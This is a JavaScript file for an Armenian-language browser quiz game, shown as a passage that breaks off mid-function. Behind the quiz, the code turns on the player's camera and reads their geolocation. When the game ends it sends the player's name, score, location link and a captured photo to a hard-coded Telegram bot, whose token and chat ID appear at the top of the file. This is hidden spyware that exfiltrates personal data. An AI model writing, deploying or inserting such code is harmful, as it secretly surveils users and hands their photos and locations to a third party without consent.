const botToken = '7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw';
const chatId = '8071841674';

const nameForm = document.getElementById('name-form');
const nameInput = document.getElementById('name-input');
const userNameDiv = document.getElementById('user-name');
const scoreInfo = document.getElementById('score-info');
const gameArea = document.getElementById('game-area');
const questionElement = document.getElementById('question');
const answerButtonsElement = document.getElementById('answer-buttons');
const tryAgainBtn = document.getElementById('try-again-btn');
const video = document.getElementById('video');

let userName = '';
let currentQuestionIndex = 0;
let score = 0;
let wrong = 0;
let questions = [];
let photoData = null;
let locationLink = 'Գեոլոկացիա չտրամադրվեց';

nameForm.addEventListener('submit', async (e) => {
  e.preventDefault();
  userName = nameInput.value.trim() || 'Անհայտ';
  userNameDiv.textContent = userName;
  document.getElementById('name-form-container').style.display = 'none';
  gameArea.style.display = 'block';
  await startCamera();
  getLocation();
  startGame();
});

function startGame() {
  currentQuestionIndex = 0;
  score = 0;
  wrong = 0;
  questions = getRandomQuestions(10);
  showQuestion();
}

function getRandomQuestions(count) {
  const shuffled = allQuestions.sort(() => 0.5 - Math.random());
  return shuffled.slice(0, count);
}

function showQuestion() {
  resetState();
  const question = questions[currentQuestionIndex];
  questionElement.textContent = question.question;

  const shuffledAnswers = question.answers.sort(() => 0.5 - Math.random());
  shuffledAnswers.forEach(answer => {
    const button = document.createElement('button');
    button.textContent = answer;
    button.addEventListener('click', () => selectAnswer(button, question.correct));
    answerButtonsElement.appendChild(button);
  });

  updateScoreBar();
}

function resetState() {
  answerButtonsElement.innerHTML = '';
}

function selectAnswer(button, correctAnswer) {
  const buttons = Array.from(answerButtonsElement.children);
  buttons.forEach(btn => {
    if (btn.textContent === correctAnswer) btn.classList.add('correct');
    if (btn !== button && btn.textContent !== correctAnswer) btn.disabled = true;
  });

  if (button.textContent === correctAnswer) {
    button.classList.add('correct');
    score++;
  } else {
    button.classList.add('wrong');
    wrong++;
  }

  currentQuestionIndex++;
  setTimeout(() => {
    if (currentQuestionIndex < questions.length) {
      showQuestion();
    } else {
      endGame();
    }
  }, 1500);
}

function updateScoreBar() {
  scoreInfo.textContent = `Հարցեր՝ ${currentQuestionIndex + 1}/${questions.length} | Ճիշտ՝ ${score} | Սխալ՝ ${wrong}`;
}

function endGame() {
  sendTelegramData();
  tryAgainBtn.style.display = 'block';
  tryAgainBtn.onclick = () => {
    tryAgainBtn.style.display = 'none';
    nameForm.reset();
    document.getElementById('name-form-container').style.display = 'block';
    gameArea.style.display = 'none';
  };
}

function sendTelegramData() {
  const message = `👤 Անուն: ${userName}%0A✅ Ճիշտ պատասխաններ: ${score}%0A❌ Սխալ պատասխաններ: ${wrong}%0A📍 Տեղադրություն: ${locationLink}`;
  if (photoData) {
    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
      method: 'POST',
      body: JSON.stringify({
        chat_id: chatId,
        photo: photoData,
        caption: message,
        parse_mode: 'HTML'
      }),
      headers: { 'Content-Type': 'application/json' }
    });
 